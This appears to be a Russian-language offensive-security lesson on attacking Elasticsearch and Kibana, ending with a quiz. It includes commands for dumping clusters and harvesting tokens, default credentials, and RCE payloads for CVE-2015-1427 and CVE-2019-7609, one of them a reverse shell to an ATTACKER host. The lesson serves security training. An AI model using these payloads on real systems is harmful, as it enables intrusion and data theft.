---
id: db-elasticsearch
title: "Elasticsearch: открытый кластер, дамп и RCE через скрипты"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 3
tags: [elasticsearch, nosql, elastic, cat, search, painless, kibana, rce]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Elasticsearch: фингерпринт 9200, анонимный доступ, дамп индексов через _cat/_search, Query DSL, painless-инъекция и RCE через скрипты и Kibana CVE."
---

Elasticsearch — распределённый поисковый движок на базе Lucene, который говорит по **HTTP/JSON** на порт 9200. Это делает его одновременно и удобным (обычный `curl`), и опасным: до версии 7.x он не имел встроенной аутентификации, а старые сборки позволяли исполнять скрипты на сервере — вплоть до RCE. Отдельный слой риска — **Kibana** (веб-морда над Elasticsearch) с её историей CVE. Если порт 9200 открыт, вы читаете весь кластер через `_cat` и `_search`; если он спрятан за приложением, инъекция уходит в **Query DSL** или **painless-скрипт**.

## Порт, фингерпринт и версия

Elasticsearch слушает **9200** (REST) и **9300** (transport, бинарный). Первый запрос отдаёт всё:

```bash
curl -s http://target:9200/
# {
#   "name" : "node-1",
#   "cluster_name" : "docker-cluster",
#   "version" : { "number" : "7.10.2", ... },
#   "tagline" : "You Know, for Search"
# }

curl -s http://target:9200/ | jq '.version.number'   # -> "7.10.2"
nmap -sV -p 9200,9300 target
```

Признаки в HTML-интерфейсах и заголовках: заголовок страницы `You Know, for Search`, `X-elastic-product: Elasticsearch`, JSON с `cluster_name`/`version.number`. Кибана на 5601 отдаёт `kbn-name` и `kbn-version`.

```bash
curl -sI http://target:9200/ | grep -i elastic
curl -s http://target:5601/api/status | jq '.version.number'   # Kibana
```

## Открытый кластер: _cat, _cluster, _nodes

При отсутствии security-модуля (`xpack.security.enabled: false`) все API доступны анонимно. Начинаем с «кошачьих» API — они отдают плоский текст.

```bash
curl -s 'http://target:9200/_cat/indices?v'      # индексы + размеры + число док-в
curl -s 'http://target:9200/_cat/nodes?v'        # узлы, версии, роли
curl -s 'http://target:9200/_cat/health?v'       # состояние кластера
curl -s 'http://target:9200/_cat/aliases?v'
curl -s 'http://target:9200/_cluster/settings?pretty'
curl -s 'http://target:9200/_nodes?pretty'       # ОС, JVM, пути, окружение
```

Полезно для картирования: `_nodes` показывает версию Java, путь установки и иногда переменные окружения; `_cat/indices` показывает, где лежат данные (например, `users`, `orders`, `logs-*`).

## Дамп индексов и документов

Дальше выгружаем содержимое.

```bash
# документы индекса
curl -s 'http://target:9200/users/_search?pretty&size=100'
curl -s 'http://target:9200/users/_search?q=*&size=1000' > users.json

# все индексы, которые начинаются на logs
curl -s 'http://target:9200/logs-*/_search?size=10&pretty'

# mapping (схема полей)
curl -s 'http://target:9200/users/_mapping?pretty'

# по одному документу
curl -s 'http://target:9200/users/_doc/1?pretty'

# счётчик документов
curl -s 'http://target:9200/users/_count?pretty'
```

Массовый дамп через `_search` с прокруткой (scroll) для больших индексов:

```bash
curl -s 'http://target:9200/users/_search?scroll=1m&size=1000' > page0.json
sid=$(jq -r '._scroll_id' page0.json)
curl -s "http://target:9200/_search/scroll" -H 'Content-Type: application/json' \
  -d "{\"scroll\":\"1m\",\"scroll_id\":\"$sid\"}" > page1.json
```

Из выгрузки ищем секреты:

```bash
jq -r '.. | strings' users.json | grep -iE 'password|token|secret|jwt|api[_-]?key' | sort -u
```

## Query DSL и инъекция в поисковые параметры

Если приложение строит запрос к Elasticsearch из пользовательского ввода, вы влияете на **Query DSL** — JSON-структуру запроса. Признаки: эндпоинт поиска, параметры `q`, `query`, `filter`, `from`/`size`.

```bash
# прямая инъекция через _search
curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
  "query": { "match_all": {} }
}'

# обход фильтра по владельцу (если приложение подставляет "owner":"victim")
curl -s 'http://target:9200/orders/_search' -H 'Content-Type: application/json' -d '{
  "query": { "bool": { "must": [ {"match_all": {}} ] } }
}'
```

Приём — заменить жёсткое условие на `match_all` или добавить `"minimum_should_match": 0`, чтобы вернулись все документы. Если параметр уходит в `q=` (Lucene query string), инъекция выглядит так:

```
q=*:*                 -> всё
q=field:*             -> поле существует
q=owner:victim OR *:* -> расширение выборки
```

## Painless script injection

Скрипты в Elasticsearch (язык **painless**) вычисляют поля на лету. Если пользовательский ввод попадает в `script`, вы исполняете код в JVM.

```bash
curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
  "query": { "bool": { "filter": {
    "script": { "script": "doc[\u0027password\u0027].value != null" }
  } } }
}'

# сортировка через скрипт (исполняется на каждом документе)
curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
  "query": { "match_all": {} },
  "sort": { "_script": { "type": "number",
    "script": { "source": "doc[\u0027id\u0027].value" }, "order": "desc" } }
}'
```

Скрипт-контекст ограничен песочницей (нет `java.lang.Runtime` напрямую), но при `script.painless.regex.enabled` и небезопасных настройках возможны выходы. На старых версиях с **Groovy** динамические скрипты давали прямой RCE — см. ниже.

## RCE через скрипты и Kibana

**Groovy (CVE-2015-1427).** Elasticsearch до 1.3.8/1.4.3 исполнял Groovy-скрипты без песочницы:

```bash
curl -s 'http://target:9200/_search' -H 'Content-Type: application/json' -d '{
  "size": 1,
  "script_fields": {
    "exp": { "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()" }
  }
}'
```

**Kibana Timelion (CVE-2019-7609).** В Kibana < 6.6.1 через Timelion можно было исполнить JS на сервере (Node.js) — цепочка с `es(*).props(...)` и `require`:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

После визита на сохранённую Timelion-вкладку Node-процесс Кибаны выполняет команду.

**Kibana Console/Dev Tools (CVE-2019-7609 и родственные), Kibana 5601.** Проверяйте версию:

```bash
curl -s http://target:5601/api/status | jq '.version.number'
```

Если версия старая — ищите соответствующий CVE-эксплойт (searchsploit `kibana`).

## Elasticsearch в стеке: Logstash, Beats, SSRF

Elasticsearch редко один — рядом Logstash (5044/9600) и Beats. Полезные точки:

- **Logstash** может принимать события извне и **выполнять фильтры**; инъекция в конфиг Logstash иногда ведёт к RCE.
- **SSRF в приложении** к `http://127.0.0.1:9200` открывает весь кластер без внешнего доступа — отправляйте `GET /_cat/indices?v` через SSRF-эндпоинт.
- **Elasticsearch как хранилище логов** часто содержит токены, куки и заголовки авторизации — дамп `logs-*` бывает ценнее самой базы.

```bash
# через SSRF-параметр
curl -s 'https://target/api/fetch?url=http://127.0.0.1:9200/_cat/indices?v'
```

## Разобранный пример

Цель: `target:9200` открыт.

```bash
# Шаг 1. Версия
curl -s http://target:9200/ | jq '.version.number,.cluster_name'
# "7.10.2" / "prod-cluster"

# Шаг 2. Индексы
curl -s 'http://target:9200/_cat/indices?v'
# users  orders  sessions  logs-app-2026.10.11

# Шаг 3. Дамп users
curl -s 'http://target:9200/users/_search?size=100&pretty' | jq '.hits.hits[]._source'

# Шаг 4. Сессии -> токены
curl -s 'http://target:9200/sessions/_search?size=100' | jq -r '.hits.hits[]._source.token'

# Шаг 5. Логи -> Authorization-заголовки
curl -s 'http://target:9200/logs-*/_search?size=200' | jq -r '..|strings' \
  | grep -iE 'authorization|bearer|password' | head

# Шаг 6. Если версия < 1.4.3 -> Groovy RCE (см. выше)
```

## Частые ошибки

- **Ожидать SQL.** Elasticsearch не понимает `' OR 1=1`; инъекция — это изменение JSON Query DSL или painless-скрипта.
- **Игнорировать версию.** Groovy-RCE есть только на очень старых версиях; painless с 5.x песочница, прямой RCE там нет.
- **Забыть про `_cat`.** Быстрейшая карта кластера — `_cat/indices`, а не перебор имён индексов.
- **Слишком большой `size`.** `size` ограничен `index.max_result_window` (по умолчанию 10000); для большего нужен scroll/`search_after`.
- **Путать 9200 и 9300.** 9300 — бинарный transport, `curl` там бесполезен; работайте по 9200.
- **Забыть про Kibana.** Открытый 9200 часто сопровождается 5601 с отдельными CVE.
- **Разрушительные запросы.** `DELETE /index`, `_delete_by_query` удаляют данные — не выполняйте без согласования.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, дамп/Query DSL, скрипты и RCE, безопасность/привилегии.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `GET /` | версия, кластер, tagline | `curl -s http://target:9200/` → `"number":"7.10.2"` |
| `jq '.version.number'` | вытащить версию | `curl -s http://target:9200/ \| jq '.version.number'` |
| `X-elastic-product` header | заголовок-признак | `curl -sI http://target:9200/ \| grep -i elastic` |
| `_cat/nodes?v` | узлы, версии, роли | `curl -s 'http://target:9200/_cat/nodes?v'` |
| `_nodes?pretty` | ОС, JVM, пути, окружение | `curl -s 'http://target:9200/_nodes?pretty'` |
| `_cluster/health?pretty` | состояние кластера | |
| `_cluster/settings?pretty` | настройки кластера | |
| Kibana `/api/status` | версия Kibana | `curl -s http://target:5601/api/status \| jq '.version.number'` |
| `kbn-name` / `kbn-version` | заголовки Kibana | `curl -sI http://target:5601/` |
| `nmap -sV -p 9200,9300` | баннер | |

### (б) Клиентские команды (curl + _cat API)

| Команда/эндпоинт | Что делает | Пример |
|------------------|-----------|--------|
| `-u user:pass` | basic-auth | `curl -u elastic:changeme http://target:9200/` |
| `-k` / `--insecure` | игнорировать TLS-сертификат | `curl -k https://target:9200/` |
| `-H 'Content-Type: application/json'` | JSON-тело | `curl -H 'Content-Type: application/json' -d '{...}'` |
| `_cat/indices?v` | индексы + размеры + док-ты | `curl -s 'http://target:9200/_cat/indices?v'` |
| `_cat/nodes?v` | узлы | |
| `_cat/health?v` | здоровье | |
| `_cat/aliases?v` | алиасы | |
| `_cat/shards?v` | шарды и размещение | |
| `_cat/count?v` | число документов | |
| `_cat/plugins?v` | плагины | |
| `_cat/thread_pool?v` | пулы потоков | |
| `_cat/segments?v` | сегменты Lucene | |
| `_cluster/state` | состояние кластера | |
| `_tasks?pretty` | задачи | |
| `elasticdump --input=... --output=...` | выгрузка индекса | `elasticdump --input=http://target:9200/users --output=users.json` |
| Kibana Dev Tools (`:5601/app/kibana#/dev_tools`) | консоль запросов | |

### (в) Дамп и Query DSL

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `_search?q=*` | все документы | `curl -s 'http://target:9200/users/_search?q=*&size=100'` |
| `{"query":{"match_all":{}}}` | все документы (DSL) | `-d '{"query":{"match_all":{}}}'` |
| `size` / `from` | пагинация | `_search?size=100&from=0` |
| `scroll=1m` + `_search/scroll` | прокрутка больших индексов | `_search?scroll=1m&size=1000` |
| `_msearch` | пакетные запросы | `POST /_msearch` c NDJSON |
| `_count` | число документов | `users/_count?pretty` |
| `_mapping` | схема полей | `users/_mapping?pretty` |
| `_doc/<id>` | один документ | `users/_doc/1?pretty` |
| `field:*` (Lucene q) | поле существует | `_search?q=email:*` |
| `owner:victim OR *:*` | расширение выборки | `_search?q=owner:victim OR *:*` |
| `{"bool":{"must":[{"match_all":{}}]}}` | обход фильтра владельца | `-d '{"query":{"bool":{"must":[{"match_all":{}}]}}}'` |
| `{"minimum_should_match":0}` | вернуть всё | |
| `_all` / `_cat/indices` | карта данных | |
| `jq -r '..\|strings'` | искать секреты в выгрузке | `jq -r '.. \| strings' users.json \| grep -iE 'pass\|token'` |

### (г) Скрипты, запись и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `script_fields` (Groovy) | RCE на ES < 1.3.8/1.4.3 (CVE-2015-1427) | `{"script_fields":{"e":{"lang":"groovy","script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}` |
| painless-скрипт | вычисление полей/сортировка | `{"script":{"source":"doc['id'].value"}}` |
| Kibana Timelion | RCE на Kibana < 6.6.1 (CVE-2019-7609) | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("id")')` |
| Kibana Console | отправка произвольных запросов | через Dev Tools |
| `_scripts/<id>` | сохранённый скрипт | `PUT _scripts/x {"script":{"lang":"painless","source":"..."}}` |
| `_ingest/pipeline` | painless в пайплайне ingest | `PUT _ingest/pipeline/p {"processors":[{"script":{...}}]}` |
| `_snapshot/<repo>` | снапшоты (чтение/запись) | `PUT _snapshot/repo {"type":"fs","settings":{"location":"/tmp"}}` |
| `_cluster/settings` | задать `path.repo` и др. | `PUT _cluster/settings {"persistent":{"path.repo":["/tmp"]}}` |
| `_reindex` | переиндексация (в т.ч. из удалённого кластера) | `POST _reindex {"source":{"remote":{...}},"dest":{"index":"x"}}` |
| `_update_by_query` / `_delete_by_query` | **изменяют данные** — только с согласования | |

### (д) Безопасность и привилегии

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `_xpack/security/_authenticate` | кто я | `curl -u elastic:p http://target:9200/_xpack/security/_authenticate` |
| `_security/user` | список пользователей | `curl -u elastic:p http://target:9200/_security/user` |
| `_security/role` | роли | |
| `_security/api_key` | API-ключи | `GET /_security/api_key` |
| `_security/user/<u>/_password` | сменить пароль | `POST /_security/user/elastic/_password {"password":"x"}` |
| `_nodes/settings?pretty` | настройки узлов | |
| `_cluster/settings?include_defaults=true` | все настройки | |
| Дефолтные пары | вход по умолчанию | `elastic:changeme`, `kibana:kibana`, `logstash:changeme`, `admin:admin` |
| `_license` | тип лицензии (есть ли security) | `GET /_license` |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какой порт по умолчанию у REST-API Elasticsearch?"
  options:
    - "6379"
    - "9200"
    - "27017"
    - "5984"
  answer: 1
  explanation: "9200 — REST; 9300 — transport. 6379/27017/5984 — Redis/Mongo/CouchDB."
- question: "Какое API перечисляет индексы кластера плоским текстом?"
  options:
    - "_cat/indices?v"
    - "_search/all"
    - "_list/db"
    - "SHOW TABLES"
  answer: 0
  explanation: "_cat/indices?v отдаёт список индексов с размерами и числом документов."
- question: "На каком языке пишутся скрипты в современном Elasticsearch?"
  options:
    - "SQL"
    - "painless"
    - "Groovy"
    - "Lua"
  answer: 1
  explanation: "painless — дефолтный язык; Groovy использовался в старых версиях и давал RCE."
- question: "Какой CVE позволяет выполнить код через Kibana Timelion?"
  options:
    - "CVE-2021-44228"
    - "CVE-2019-7609"
    - "CVE-2015-1427"
    - "CVE-2017-12635"
  answer: 1
  explanation: "CVE-2019-7609 — Kibana Timelion RCE; CVE-2015-1427 — Groovy в Elasticsearch."
- question: "Что чаще всего ценно в логах Elasticsearch?"
  options:
    - "Размер индексов"
    - "Токены, куки и заголовки Authorization"
    - "Названия узлов"
    - "Версия Java"
  answer: 1
  explanation: "Логи содержат авторизационные заголовки и секреты, попавшие в запросы."
```

## Где пригодится

- **CTF (Web):** открытый Elasticsearch — быстрый флаг через `_cat` и `_search`; старые версии дают RCE.
- **Bug bounty:** незащищённый 9200 в интернете — частый critical (утечка данных); Kibana CVE — отдельная программа.
- **Пентест:** ES в стеке с логами/сессиями — источник токенов и путь к латеральному движению.
- **Работа (AppSec):** hardening (включить `xpack.security`, bind на localhost, обновлять Kibana) — прямой вывод из этих атак.
